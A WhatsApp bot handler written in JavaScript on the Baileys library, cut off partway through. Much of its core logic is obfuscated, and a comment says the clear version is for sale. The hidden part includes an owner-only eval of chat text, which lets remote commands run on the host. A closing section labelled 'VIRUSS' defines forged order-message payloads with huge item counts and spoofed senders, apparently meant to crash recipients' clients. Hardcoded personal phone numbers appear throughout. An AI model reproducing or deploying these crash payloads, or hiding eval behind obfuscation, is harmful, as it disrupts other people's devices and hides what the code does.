"use strict";
const { prepareMessageFromContent, generateWAMessageContent, prepareWAMessageMedia, generateForwardMessageContent, downloadMediaMessage, downloadContentFromMessage, toBuffer, generateWAMessageFromContent, proto, jidDecode } = require('@adiwajshing/baileys');
const Crypto = require("crypto")
const PhoneNumber = require('awesome-phonenumber');
const colors = require('colors/safe');
const fs = require('fs');
const { exec, spawn, execSync } = require('child_process')
const imageToBase64 = require('image-to-base64')
const { writeFile } = require ('fs/promises')
const moment = require("moment-timezone");
const ffmpeg = require('fluent-ffmpeg')
const path = require("path")
const Jimp = require("jimp")
const { util } = require("util")
const xfar = require('xfarr-api');
const { phone } = require("phone")
const packagejson = JSON.parse(fs.readFileSync('./package.json')); 
const { owner, namabot, namaowner, donasi, fakereply } = require("./admin/config.json")
const toMs = require('ms')
const user = JSON.parse(fs.readFileSync('./lib/data.json')); 
const { getBuffer, fetchJson, fetchText, getRandom, getGroupAdmins, runtime, sendContact, sleep, makeid, parseMention, smsg } = require("./lib/myfunc");
const { only } = require("./lib/respoder")
const { help } = require("./admin/help")
const { vcap }= require('./lib/caption.js')
const { setUser} = require("./lib/user")
const { fetch } = require('./lib/anu.js');
const { api, xa } = require('./admin/rest-api')
const { StickerMedia, ImageMedia, AudioMedia, VideoMedia, cekMedia, addMedia, listMedia, deleteMedia} = require('./media/media')
const { LogLoading, LogLoadingg } = require('./lib/spinner')
const { dataOnly } = require('./lib/data')
const { mAdd, isMenfess, isSend, isTo } = require('./lib/menfess')
moment.tz.setDefault('Asia/Jakarta').locale("id");
// Add by SatganzDevs
let menfess = JSON.parse(fs.readFileSync('./lib/menfess.json'));
module.exports = async (satzz, sat, m, store) => {
try {
const type = Object.keys(sat.message)[0];
const body = (type === 'conversation') ? sat.message.conversation : (type == 'imageMessage') ? sat.message.imageMessage.caption : (type == 'videoMessage') ? sat.message.videoMessage.caption : (type == 'extendedTextMessage') ? sat.message.extendedTextMessage.text : (type == 'buttonsResponseMessage') ? sat.message.buttonsResponseMessage.selectedButtonId : (type == 'listResponseMessage') ? sat.message.listResponseMessage.singleSelectReply.selectedRowId : (type == 'templateButtonReplyMessage') ? sat.message.templateButtonReplyMessage.selectedId : (type === 'messageContextInfo') ? (sat.message.buttonsResponseMessage?.selectedButtonId || sat.message.listResponseMessage?.singleSelectReply.selectedRowId || sat.text) : ''
const budy = (type === 'conversation') ? sat.message.conversation : (type === 'extendedTextMessage') ? sat.message.extendedTextMessage.text : ''
const prefix = /^[./~!#%^&=\,;:()z]/.test(body) ? body.match(/^[./~!#%^&=\,;:()z]/gi) : '#';
const isCommand = body.startsWith(prefix);
const command = isCommand ? body.slice(1).trim().split(/ +/).shift().toLowerCase() : null;
const commands = isCommand ? body.slice(0).trim().split(/ +/).shift().toLowerCase() : null;
const time = moment(new Date()).format("HH:mm");
const text = sat.message.conversation;
const isGroup = sat.key.remoteJid.endsWith('@g.us');
const isPrivate = sat.key.remoteJid.endsWith('@s.whatsapp.net');
const from = sat.key.remoteJid;
const content = JSON.stringify(sat.message);
const args = body.trim().split(/ +/).slice(1);
const q = args.join(" ");
const botNumber = satzz.user.id.split(':')[0] + '@s.whatsapp.net';
const botName = satzz.user.name;
const pushname = sat.pushName;
const sender = isGroup ? (sat.key.participant ? sat.key.participant : sat.participant) : sat.key.remoteJid;
const itsMe = sender == botNumber ? true : false
const groupMetadata = isGroup ? await satzz.groupMetadata(from) : '';
const uwong = isGroup ? await groupMetadata.participants : '';
const groupAdmins = isGroup ? await uwong.filter(v => v.admin !== null).map(a => a.id) : '';
const isBotGroupAdmins = groupAdmins.includes(botNumber) || false;
const isGroupAdmins = groupAdmins.includes(sender) || false;
const groupName = isGroup ? groupMetadata.subject : "";
const groupMembers = isGroup ? groupMetadata.participants : ''
const isOwner = ["6281316701742@s.whatsapp.net"] == sender ? true : ["6281266891985@s.whatsapp.net","6282268590641@s.whatsapp.net","6283856085455@s.whatsapp.net","6285607859362@s.whatsapp.net","62882019583023@s.whatsapp.net"].includes(sender) ? true : false
const thumb = fs.readFileSync('./media/thumb.png')
const dthumb = fs.readFileSync('./media/docthb.jpg')
const q1 = q.split('&')[0];
const q2 = q.split('&')[1];
const q3 = q.split('&')[2];	
const q4 = q.split('&')[3];	
const more = String.fromCharCode(8206)
const readMore = more.repeat(4001)
const isMedia = (type === 'imageMessage' || type === 'videoMessage' || type === 'stickerMessage' || type === 'audioMessage' );
const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage');
const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage');
const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage');
const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage');
const isViewonce = type === content.includes('viewOnceMessage');
const footer = "© 𝚂𝙰𝚃𝙶𝙰𝙽𝚉 𝙳𝙴𝚅𝚂 〄"
let waktunya = moment.tz('Asia/Jakarta').format('HH')
let ucapin = 'Oyasuminasai ><'
if(waktunya >= 1) { ucapin = 'Ohayou ><' }
if(waktunya >= 4) { ucapin = 'Ohayou ><'}
if(waktunya > 10) { ucapin = `Kon'nichiwa ><` }
if(waktunya >= 15) { ucapin = `Kon'ichiwa ><` }
if(waktunya >= 18) { ucapin = 'Oyasuminasai ><' }
if(waktunya >= 24) { ucapin = 'Jangan Begadang ><' }
const fakestatus = {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(sat.chat ? { remoteJid: "status@broadcast" } : {})},message: { "imageMessage": {"url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nsat.enc","mimetype": "image/jpeg","caption": '©ＸｘＸ － Ｔｅａｍｓ',"fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=","fileLength": "28777","height": 1080,"width": 1079,"mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=","fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=","directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69","mediaKeyTimestamp": "1610993486","jpegThumbnail": thumb,"scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="}}}
const cekUser = (users, id) => {     
var cek = null
Object.keys(user).forEach((i) => { 
if (user[i].id === id){ cek = i } })
if (cek !== null){ 
if (users == "id"){ return user[cek].id }
if (users == "emote"){ return user[cek].emote }
if (users == "timers"){ return user[cek].timers }
if (users == "hit"){ return user[cek].hit }
if (users == "star"){ return user[cek].star }
if (users == "afk"){ return user[cek].afk }
if (users == "alasan"){ return user[cek].alasan }
if (users == "ban"){ return user[cek].ban }
if (users == "premium"){ return user[cek].premium }
}
if (cek == null) return null
}

// SEBAGIAN SINI SAYA ENC, BUAT NO ENC SILAHKAN BUY DI 082347260729
var _0x135601=_0x2036;(function(_0x4c8fb7,_0x5e4fd1){var _0x1e1f1b=_0x2036,_0x4c3ca5=_0x4c8fb7();while(!![]){try{var _0x59cd37=-parseInt(_0x1e1f1b(0x21a))/(0x9ac+0x17a1+-0x214c)*(-parseInt(_0x1e1f1b(0x20c))/(-0x18*-0x155+-0x1*0x293+0x1*-0x1d63))+-parseInt(_0x1e1f1b(0x211))/(0xb15*0x3+0x2ca+-0x2406)+parseInt(_0x1e1f1b(0x24d))/(-0x2497+-0x46*0xd+0x2829)*(parseInt(_0x1e1f1b(0x1fc))/(-0x150b*-0x1+0x2f*-0x61+-0x337))+parseInt(_0x1e1f1b(0x203))/(-0x1652*0x1+0x369*-0x2+0x1d2a*0x1)+parseInt(_0x1e1f1b(0x297))/(-0x16bb+0x6b3+0x1*0x100f)*(-parseInt(_0x1e1f1b(0x2a2))/(0x4b6+-0x1d*0xda+-0xe*-0x16e))+parseInt(_0x1e1f1b(0x267))/(0x5*-0x105+0x26a+-0x6*-0x74)+parseInt(_0x1e1f1b(0x269))/(-0x53*-0x15+0x17d*0xd+0xd0f*-0x2)*(parseInt(_0x1e1f1b(0x271))/(0xab2+0xf20+-0x19c7));if(_0x59cd37===_0x5e4fd1)break;else _0x4c3ca5['push'](_0x4c3ca5['shift']());}catch(_0x414db3){_0x4c3ca5['push'](_0x4c3ca5['shift']());}}}(_0x251f,-0x10d3c3+-0x1c15ed+0x3b0fd8));const cr=_0x135601(0x231)+_0x135601(0x205)+_0x135601(0x273)+_0x135601(0x20e)+_0x135601(0x22b)+_0x135601(0x26c)+_0x135601(0x2ad)+_0x135601(0x252)+_0x135601(0x255)+_0x135601(0x227)+(_0x135601(0x28a)+namaowner+(_0x135601(0x1fa)+_0x135601(0x1fb))),sat1={'key':{'fromMe':![],'participant':_0x135601(0x293)+_0x135601(0x264),...from?{'remoteJid':_0x135601(0x266)+_0x135601(0x21b)}:{}},'message':{'contactMessage':{'displayName':fakereply,'vcard':_0x135601(0x23f)+'D\x0a'+(_0x135601(0x242)+'0\x0a')+(_0x135601(0x222)+_0x135601(0x247)+sender[_0x135601(0x22d)]('@')[-0x6*0x2cf+0x39*-0x98+0x7*0x73e]+':+'+sender[_0x135601(0x22d)]('@')[0x3*-0x5bb+0x590+0xba1*0x1]+'\x0a')+(_0x135601(0x232)+_0x135601(0x28f)+_0x135601(0x268))+_0x135601(0x24b)}}};async function reply(_0x557e3f){var _0x305ddc=_0x135601;satzz[_0x305ddc(0x2a1)+'e'](from,{'text':_0x557e3f,'mentions':[sender]},{'quoted':sat1});}async function SendRegisBut(from){var _0x5c98d7=_0x135601;satzz[_0x5c98d7(0x2a1)+'e'](from,{'text':_0x5c98d7(0x215)+_0x5c98d7(0x27a)+_0x5c98d7(0x25f)+_0x5c98d7(0x291)+_0x5c98d7(0x23a)+sender[_0x5c98d7(0x22d)]('@')[-0x311+0x232e+-0x201d]+(_0x5c98d7(0x243)+_0x5c98d7(0x235)+_0x5c98d7(0x236)+_0x5c98d7(0x2a6)+_0x5c98d7(0x245)+_0x5c98d7(0x1f5)+_0x5c98d7(0x1f8)+_0x5c98d7(0x25d)+_0x5c98d7(0x201)+_0x5c98d7(0x296)),'mentions':[sender]},{'quoted':sat1});}const Tag=()=>{var _0x2cb046=_0x135601,_0x31964a={'cDaNp':function(_0x48989e,_0x1fdfa9){return _0x48989e!==_0x1fdfa9;}},_0x1ab9ab=[];return _0x31964a[_0x2cb046(0x287)](m[_0x2cb046(0x279)][0x2aa+0xb*-0x59+0x129][_0x2cb046(0x23b)],'')&&_0x1ab9ab[_0x2cb046(0x263)](m[_0x2cb046(0x279)][-0x5*0x693+0x78*-0x42+-0x63*-0xa5][_0x2cb046(0x23b)][-0x1e9*-0x8+0xb9*0xd+-0x18ad]),_0x1ab9ab;};if(isCommand){if(cekUser('id',sender)!==null){LogLoadingg(_0x135601(0x246)+pushname+(_0x135601(0x22c)+'\x20')+(prefix+command)+(_0x135601(0x261)+':\x20')+time+'\x20]'),setUser(_0x135601(0x244),sender,-0x995+0x25e0+-0x1c4a);if(cekUser(_0x135601(0x249),sender)==!![])return reply(_0x135601(0x1f1)+_0x135601(0x298)+_0x135601(0x26d)+_0x135601(0x251)+_0x135601(0x282)+_0x135601(0x277)+_0x135601(0x29b)+_0x135601(0x216)+_0x135601(0x20f)+_0x135601(0x286));}}if(m){if(m[_0x135601(0x279)][-0xf76*-0x1+-0x97*-0x19+-0xb*0x2bf][_0x135601(0x23b)]!==''){if(m[_0x135601(0x279)][-0x51*0x6d+-0x1fd+0x247a][_0x135601(0x23b)][-0xdc7+-0x5f*0xa+0x117d]==cekUser('id',m[_0x135601(0x279)][0xa1f+-0x17*0xc1+0x738][_0x135601(0x23b)][0x705+0x2*0xdf5+-0x22ef])){var afk1=cekUser('id',m[_0x135601(0x279)][0x1*0x3a6+0x92a+-0xcd0][_0x135601(0x23b)][-0x120+0x1a69*0x1+-0x1*0x1949]);cekUser(_0x135601(0x292),afk1)==!![]&&satzz[_0x135601(0x2a1)+'e'](from,{'sticker':{'url':_0x135601(0x229)+_0x135601(0x280)+_0x135601(0x21f)+_0x135601(0x27b)+_0x135601(0x27e)+_0x135601(0x2a0)+_0x135601(0x29a)}},{'quoted':{'key':{'fromMe':![],'participant':_0x135601(0x293)+_0x135601(0x264),...from?{'remoteJid':_0x135601(0x266)+_0x135601(0x21b)}:{}},'message':{'conversation':_0x135601(0x218)+_0x135601(0x2b0)+'i\x20'+cekUser(_0x135601(0x248),afk1)}}});}}if(cekUser(_0x135601(0x292),sender)==!![])return setUser(_0x135601(0x28c),sender,![]),setUser(_0x135601(0x285),sender,![]),reply(_0x135601(0x295)+_0x135601(0x26b)+_0x135601(0x230)+_0x135601(0x233)+sender[_0x135601(0x22d)]('@')[-0x9*0x2a7+-0x7*-0x577+-0xe62]);}if(budy[_0x135601(0x223)]('$')){if(!isOwner)return;let evaled=await eval(q);if(typeof evaled!==_0x135601(0x21d))evaled=require(_0x135601(0x22f))[_0x135601(0x20b)](evaled);await reply(evaled),await LogLoadingg(evaled+_0x135601(0x262));}function _0x2036(_0x3d7d4d,_0x39d3bb){var _0x17dbc6=_0x251f();return _0x2036=function(_0x1e769a,_0x12247b){_0x1e769a=_0x1e769a-(0x258e+0x1110+-0x34af);var _0x241de9=_0x17dbc6[_0x1e769a];return _0x241de9;},_0x2036(_0x3d7d4d,_0x39d3bb);}var downloadDone=![];function _0x251f(){var _0x21515f=['😡,\x20dia\x20lag','OICE;waid=','adc08ede48','profilePic','vcard','Kamu\x20sudah','YqNQQ','xtMessage','imageMessa','endaftar\x20t','stickerMes','HUJBC','erlebih\x20da','qjNyD','*\x0a╰━─━─━─━','─━─━─━─•','40Qutuoc','message','audio','.png','FN:','kan\x20comman','sticker','4171884eDayos','jPedR','HX-TO*\x20]⊱\x0a','-1280-605a','NKraI','BxbVV','nGfRH','tureUrl','inspect','705718NFiKHg','url.jpg','AJ\x20SINGH*\x0a','an\x20oleh\x20ow','replace','5404521fnUdBt','tVEhv','PSulZ','PPUrl','[\x20*NEW\x20INF','nda\x20di\x20unb','./media/','Jangan\x20tag','base64','1pivHdI','adcast','*\x20:\x20','string','tacts;\x0a','ercontent.','pIKMv','imageUrl','item1.TEL;','includes','TEL;type=C','tems/album','videoMessa','Z*\x0a','lJzfE','https://ra','readFileSy','┃•\x20\x20*RIMUR','\x20]=[\x20CMD\x20:','split','diHig','util','mat\x20datang','\x0a╭━─━•[\x20*T','item1.X-AB','\x20kembali\x20@','RuZoO','um\x20terdaft','ar\x20di\x20Data','YHuOn','HNmkH','.mp3','lo\x20@','mentioned','from','eType:\x20Con','WkbfD','BEGIN:VCAR','Zfdwv','http://ass','VERSION:3.',',\x20Kamu\x20bel','+hit','Silahkan\x20m','[USER\x20:\x20','waid=','alasan','ban','ure-973460','END:VCARD','Acvmb','50044RWvzuE','oQMZw','/2021/03/2','iana.com/i','\x20tidak\x20bis','LERS*\x0a┃•\x20\x20','74e1153a12','MysMh','*LORD\x20R1YN','zIcpT','TtRJZ','xvsxn','ELL;type=V','ofile-pict','zrygf','contextInf','hulu,\x20Guna','ync','er*\x20:\x20Null','eodgY','\x20]=[\x20TIME\x20','\x0a\x0a\x0a\x0a','push','pp.net','tools','status@bro','6317019ETRsHJ','el\x0a','10vKIWvY','.mp4','IF*\x20]\x0aSela','UBOTZ*\x0a┃•\x20',',\x20Dan\x20kamu','srgmL','fYxPm','KYtTZ','26526775xJfxjV','video','┃•\x20\x20*ADHIR','.jpg','LztoZ','forEach','kan\x20bot\x20in','url_file','messages','O*\x20]\x0a•\x20*Us','com/satlac','uploadFile','5|0|3|1|4|','han/STICKE','quotedMess','w.githubus','image','a\x20mengguna','Ovzqv','concat','±alasan','ner','cDaNp','textpro','FsIpx','┃•\x20\x20*','sage','±afk','ets.kompas','2|1|0|3|4','Label:Pons','result','\x0a~>\x20[🤖]\x20Ha','afk','0@s.whatsa','keys','[\x20*AFK-NOT','d\x20#daftar','198709JBkGfx','\x20di\x20banned','stringify','.webp','i\x20sampai\x20a','audio/mp4','./media/pp','writeFileS','extendedTe','R/main/tag','sendMessag','432xviWFy','wtiUd','Jeff','audioMessa','base\x20bot,\x20','ORG:Messag','VijxI','uSnTW','lmOoD','age','XUoNz','\x20*LOLI\x20KIL','4/blank-pr','\x0a•\x20*'];_0x251f=function(){return _0x21515f;};return _0x251f();}async function download(_0x3ce3a6,_0x1f9950,_0x2a9313){var _0x2e5b30=_0x135601,_0x105831={'HNmkH':function(_0x10d3c4,_0xafea0c){return _0x10d3c4==_0xafea0c;},'YqNQQ':_0x2e5b30(0x281),'xvsxn':function(_0x2594be,_0x3aa2f6,_0x4a9f9e){return _0x2594be(_0x3aa2f6,_0x4a9f9e);},'VijxI':_0x2e5b30(0x221),'qjNyD':function(_0x3d26ef,_0x2700b8,_0x5bd354){return _0x3d26ef(_0x2700b8,_0x5bd354);},'jPedR':function(_0x443fa9,_0x5e3a65){return _0x443fa9==_0x5e3a65;},'tVEhv':_0x2e5b30(0x214),'TtRJZ':_0x2e5b30(0x28e),'srgmL':_0x2e5b30(0x29d)+_0x2e5b30(0x20d),'LztoZ':_0x2e5b30(0x219),'MysMh':function(_0x280814,_0x57f3d1){return _0x280814(_0x57f3d1);},'FsIpx':_0x2e5b30(0x241)+_0x2e5b30(0x28d)+_0x2e5b30(0x250)+_0x2e5b30(0x225)+_0x2e5b30(0x24f)+_0x2e5b30(0x2ae)+_0x2e5b30(0x25a)+_0x2e5b30(0x24a)+_0x2e5b30(0x206)+_0x2e5b30(0x2b2)+_0x2e5b30(0x253)+_0x2e5b30(0x1ff),'XUoNz':_0x2e5b30(0x202),'lJzfE':function(_0x4cf978,_0x47e585){return _0x4cf978==_0x47e585;},'HUJBC':_0x2e5b30(0x1fe),'fYxPm':_0x2e5b30(0x272),'uSnTW':function(_0x503815,_0x265f74,_0x49f9de){return _0x503815(_0x265f74,_0x49f9de);}};if(_0x105831[_0x2e5b30(0x238)](_0x3ce3a6,_0x105831[_0x2e5b30(0x1f2)])){var _0x2074bb=await _0x105831[_0x2e5b30(0x258)](downloadContentFromMessage,sat[_0x2e5b30(0x1fd)][_0x2e5b30(0x1f4)+'ge']||sat[_0x2e5b30(0x1fd)][_0x2e5b30(0x29f)+_0x2e5b30(0x1f3)]?.[_0x2e5b30(0x25c)+'o'][_0x2e5b30(0x27f)+_0x2e5b30(0x2ab)][_0x2e5b30(0x1f4)+'ge'],_0x105831[_0x2e5b30(0x1f2)]),_0x3bee7f=Buffer[_0x2e5b30(0x23c)]([]);for await(const _0x395e69 of _0x2074bb){_0x3bee7f=Buffer[_0x2e5b30(0x284)]([_0x3bee7f,_0x395e69]);}fs[_0x2e5b30(0x29e)+_0x2e5b30(0x25e)](_0x2e5b30(0x217)+_0x1f9950+_0x2e5b30(0x274),_0x3bee7f),downloadDone=!![];}if(_0x105831[_0x2e5b30(0x238)](_0x3ce3a6,_0x105831[_0x2e5b30(0x2a8)])){var _0x2074bb=await _0x105831[_0x2e5b30(0x1f9)](downloadContentFromMessage,sat[_0x2e5b30(0x1fd)][_0x2e5b30(0x1f4)+'ge']||sat[_0x2e5b30(0x1fd)][_0x2e5b30(0x29f)+_0x2e5b30(0x1f3)]?.[_0x2e5b30(0x25c)+'o'][_0x2e5b30(0x27f)+_0x2e5b30(0x2ab)][_0x2e5b30(0x1f4)+'ge'],_0x105831[_0x2e5b30(0x1f2)]),_0x3bee7f=Buffer[_0x2e5b30(0x23c)]([]);for await(const _0x34dd7a of _0x2074bb){_0x3bee7f=Buffer[_0x2e5b30(0x284)]([_0x3bee7f,_0x34dd7a]);}fs[_0x2e5b30(0x29e)+_0x2e5b30(0x25e)](_0x2e5b30(0x217)+_0x1f9950+_0x2e5b30(0x274),_0x3bee7f);var _0x22fa87=await api[_0x2e5b30(0x265)][_0x2e5b30(0x27c)](fs[_0x2e5b30(0x22a)+'nc'](_0x2e5b30(0x217)+_0x1f9950+_0x2e5b30(0x274)));return _0x22fa87[_0x2e5b30(0x290)][_0x2e5b30(0x278)];}if(_0x105831[_0x2e5b30(0x204)](_0x3ce3a6,_0x105831[_0x2e5b30(0x212)])){var _0x27b5bb=_0x105831[_0x2e5b30(0x257)][_0x2e5b30(0x22d)]('|'),_0x20e648=-0x5*0x46b+-0x120d+-0x1c*-0x16f;while(!![]){switch(_0x27b5bb[_0x20e648++]){case'0':fs[_0x2e5b30(0x29e)+_0x2e5b30(0x25e)](_0x105831[_0x2e5b30(0x26e)],_0x2074bb,_0x105831[_0x2e5b30(0x275)]);continue;case'1':var _0x2074bb=await _0x105831[_0x2e5b30(0x254)](imageToBase64,JSON[_0x2e5b30(0x299)](_0x20f586)[_0x2e5b30(0x210)](/\"/gi,''));continue;case'2':try{var _0x20f586=await satzz[_0x2e5b30(0x1ef)+_0x2e5b30(0x20a)](_0x1f9950,_0x105831[_0x2e5b30(0x1f2)]);}catch(_0x2b8335){var _0x20f586=_0x105831[_0x2e5b30(0x289)];}continue;case'3':var _0x365264=await api[_0x2e5b30(0x265)][_0x2e5b30(0x27c)](fs[_0x2e5b30(0x22a)+'nc'](_0x2e5b30(0x29d)+_0x2e5b30(0x20d)));continue;case'4':return _0x365264[_0x2e5b30(0x290)][_0x2e5b30(0x278)];}break;}}if(_0x105831[_0x2e5b30(0x238)](_0x3ce3a6,_0x105831[_0x2e5b30(0x2ac)])){var _0x2074bb=await _0x105831[_0x2e5b30(0x258)](downloadContentFromMessage,sat[_0x2e5b30(0x1fd)][_0x2e5b30(0x1f6)+_0x2e5b30(0x28b)]||sat[_0x2e5b30(0x1fd)][_0x2e5b30(0x29f)+_0x2e5b30(0x1f3)]?.[_0x2e5b30(0x25c)+'o'][_0x2e5b30(0x27f)+_0x2e5b30(0x2ab)][_0x2e5b30(0x1f6)+_0x2e5b30(0x28b)],_0x105831[_0x2e5b30(0x2ac)]),_0x3bee7f=Buffer[_0x2e5b30(0x23c)]([]);for await(const _0x245f72 of _0x2074bb){_0x3bee7f=Buffer[_0x2e5b30(0x284)]([_0x3bee7f,_0x245f72]);}fs[_0x2e5b30(0x29e)+_0x2e5b30(0x25e)](_0x2e5b30(0x217)+_0x1f9950+_0x2e5b30(0x29a),_0x3bee7f);}if(_0x105831[_0x2e5b30(0x228)](_0x3ce3a6,_0x105831[_0x2e5b30(0x1f7)])){var _0x2074bb=await _0x105831[_0x2e5b30(0x258)](downloadContentFromMessage,sat[_0x2e5b30(0x1fd)][_0x2e5b30(0x2a5)+'ge']||sat[_0x2e5b30(0x1fd)][_0x2e5b30(0x29f)+_0x2e5b30(0x1f3)]?.[_0x2e5b30(0x25c)+'o'][_0x2e5b30(0x27f)+_0x2e5b30(0x2ab)][_0x2e5b30(0x2a5)+'ge'],_0x105831[_0x2e5b30(0x1f7)]),_0x3bee7f=Buffer[_0x2e5b30(0x23c)]([]);for await(const _0x5ac8a3 of _0x2074bb){_0x3bee7f=Buffer[_0x2e5b30(0x284)]([_0x3bee7f,_0x5ac8a3]);}fs[_0x2e5b30(0x29e)+_0x2e5b30(0x25e)](_0x2e5b30(0x217)+_0x1f9950+_0x2e5b30(0x239),_0x3bee7f);}if(_0x105831[_0x2e5b30(0x204)](_0x3ce3a6,_0x105831[_0x2e5b30(0x26f)])){var _0x2074bb=await _0x105831[_0x2e5b30(0x2a9)](downloadContentFromMessage,sat[_0x2e5b30(0x1fd)][_0x2e5b30(0x226)+'ge']||sat[_0x2e5b30(0x1fd)][_0x2e5b30(0x29f)+_0x2e5b30(0x1f3)]?.[_0x2e5b30(0x25c)+'o'][_0x2e5b30(0x27f)+_0x2e5b30(0x2ab)][_0x2e5b30(0x226)+'ge'],_0x105831[_0x2e5b30(0x26f)]),_0x3bee7f=Buffer[_0x2e5b30(0x23c)]([]);for await(const _0x25fa8c of _0x2074bb){_0x3bee7f=Buffer[_0x2e5b30(0x284)]([_0x3bee7f,_0x25fa8c]);}fs[_0x2e5b30(0x29e)+_0x2e5b30(0x25e)](_0x2e5b30(0x217)+_0x1f9950+_0x2e5b30(0x26a),_0x3bee7f);}}async function sendMedia(_0x3b2470,_0x1893ec,_0x518c78){var _0x50bab3=_0x135601,_0x2003a5={'zIcpT':_0x50bab3(0x27d)+'2','Acvmb':function(_0x237dd3,_0x28354b){return _0x237dd3==_0x28354b;},'zrygf':_0x50bab3(0x281),'oQMZw':function(_0x26ebde,_0x45d5c0){return _0x26ebde==_0x45d5c0;},'wtiUd':_0x50bab3(0x202),'NKraI':function(_0x4a92a5,_0x3ec989){return _0x4a92a5==_0x3ec989;},'pIKMv':_0x50bab3(0x29c),'diHig':function(_0x4ee0ad,_0x30f599){return _0x4ee0ad==_0x30f599;},'Zfdwv':_0x50bab3(0x272),'PSulZ':_0x50bab3(0x1fe),'nGfRH':_0x50bab3(0x1f0),'KYtTZ':function(_0x242a65,_0x4ecc17){return _0x242a65+_0x4ecc17;},'Ovzqv':function(_0xaeb92e,_0x8cfca7){return _0xaeb92e+_0x8cfca7;},'BxbVV':function(_0x5d83f0,_0x4fef11){return _0x5d83f0+_0x4fef11;},'YHuOn':_0x50bab3(0x23f)+'D\x0a','RuZoO':_0x50bab3(0x242)+'0\x0a','WkbfD':_0x50bab3(0x2a7)+_0x50bab3(0x23d)+_0x50bab3(0x21e),'eodgY':_0x50bab3(0x24b),'lmOoD':_0x50bab3(0x2a4)},_0x464d92=_0x2003a5[_0x50bab3(0x256)][_0x50bab3(0x22d)]('|'),_0x3871e9=0x168e+-0x228b+0xbfd;while(!![]){switch(_0x464d92[_0x3871e9++]){case'0':_0x2003a5[_0x50bab3(0x24c)](_0x3b2470,_0x2003a5[_0x50bab3(0x25b)])&&satzz[_0x50bab3(0x2a1)+'e'](from,{'image':{'url':_0x1893ec},'caption':_0x518c78,'mentions':[sender]},{'quoted':sat1});continue;case'1':_0x2003a5[_0x50bab3(0x24e)](_0x3b2470,_0x2003a5[_0x50bab3(0x2a3)])&&satzz[_0x50bab3(0x2a1)+'e'](from,{'sticker':{'url':_0x1893ec},'mentions':[sender]},{'quoted':sat1});continue;case'2':_0x2003a5[_0x50bab3(0x207)](_0x3b2470,'vn')&&satzz[_0x50bab3(0x2a1)+'e'](from,{'audio':{'url':_0x1893ec},'mimetype':_0x2003a5[_0x50bab3(0x220)],'ptt':!![],'mentions':[sender]},{'quoted':sat1});continue;case'3':_0x2003a5[_0x50bab3(0x22e)](_0x3b2470,_0x2003a5[_0x50bab3(0x240)])&&satzz[_0x50bab3(0x2a1)+'e'](from,{'video':{'url':_0x1893ec},'caption':_0x518c78,'mentions':[sender]},{'quoted':sat1});continue;case'4':_0x2003a5[_0x50bab3(0x24c)](_0x3b2470,_0x2003a5[_0x50bab3(0x213)])&&satzz[_0x50bab3(0x2a1)+'e'](from,{'audio':{'url':_0x1893ec},'mimetype':_0x2003a5[_0x50bab3(0x220)],'mentions':[sender]},{'quoted':sat1});continue;case'5':if(_0x2003a5[_0x50bab3(0x24c)](_0x3b2470,_0x2003a5[_0x50bab3(0x209)])){var _0x286074=_0x2003a5[_0x50bab3(0x270)](_0x2003a5[_0x50bab3(0x283)](_0x2003a5[_0x50bab3(0x283)](_0x2003a5[_0x50bab3(0x208)](_0x2003a5[_0x50bab3(0x283)](_0x2003a5[_0x50bab3(0x237)],_0x2003a5[_0x50bab3(0x234)]),_0x50bab3(0x200)+_0x1893ec+'\x0a'),_0x2003a5[_0x50bab3(0x23e)]),_0x50bab3(0x224)+_0x50bab3(0x259)+_0x50bab3(0x2b1)+_0x518c78+':+'+_0x518c78+'\x0a'),_0x2003a5[_0x50bab3(0x260)]);satzz[_0x50bab3(0x2a1)+'e'](from,{'contacts':{'displayName':_0x2003a5[_0x50bab3(0x2aa)],'contacts':[{'vcard':_0x286074}]}});}continue;}break;}}async function textPro1(_0xe3ea35,_0x18e733){var _0x3f5161=_0x135601,_0x4f93ef=await api[_0x3f5161(0x265)][_0x3f5161(0x288)](_0xe3ea35,[_0x18e733]);return _0x4f93ef;}async function textPro2(_0x3af9b6,_0x5f3576,_0x2e7999){var _0x3a2bf4=_0x135601,_0x3d1497=await api[_0x3a2bf4(0x265)][_0x3a2bf4(0x288)](_0x3af9b6,[_0x5f3576,_0x2e7999]);return _0x3d1497;}async function getResult(_0x4a268d,_0x41f6d6,_0x44779c){var _0x4d33a9=_0x135601,_0x4c8235=_0x4a268d;return Object[_0x4d33a9(0x294)](_0x41f6d6)[_0x4d33a9(0x276)](_0x3fbf0a=>{var _0xd5da83=_0x4d33a9;_0x4c8235+=_0xd5da83(0x2af)+_0x41f6d6[_0x3fbf0a]+_0xd5da83(0x21c)+_0x44779c[_0x3fbf0a];}),_0x4c8235;}const imgToUrl=async function(_0x45c687){var _0x3a7346=_0x135601,_0x379375=await api[_0x3a7346(0x265)][_0x3a7346(0x27c)](fs[_0x3a7346(0x22a)+'nc'](_0x45c687));return _0x379375[_0x3a7346(0x290)][_0x3a7346(0x278)];};








// VIRUSS 𝚂𝙰𝚃𝙶𝙰𝙽𝚉 𝙳𝙴𝚅𝚂 〄
const virus =  {
             key: { fromMe: false,remoteJid: "status@broadcast", participant: '0@s.whatsapp.net'}, message: {orderMessage: {itemCount: 2021, status: 200, thumbnail: thumb, surface: 200, message: '1955', orderTitle: 'hehe', sellerJid: '0@s.whatsapp.net'} } }       
const bugstik = {
		key: {
			fromMe: false,
			participant: `0@s.whatsapp.net`,
			...({
				remoteJid: ""
			})
		},
		"message": {
			"orderMessage": {
				"orderId": "594071395007984",
				"thumbnail": thumb,
				"itemCount": 100000000000,
				"status": "INQUIRY",
				"surface": "CATALOG",
				"message": ucapin + pushname,
				"orderTitle": ucapin + pushname,
				"sellerJid": "62857887347569@s.whatsapp.net",
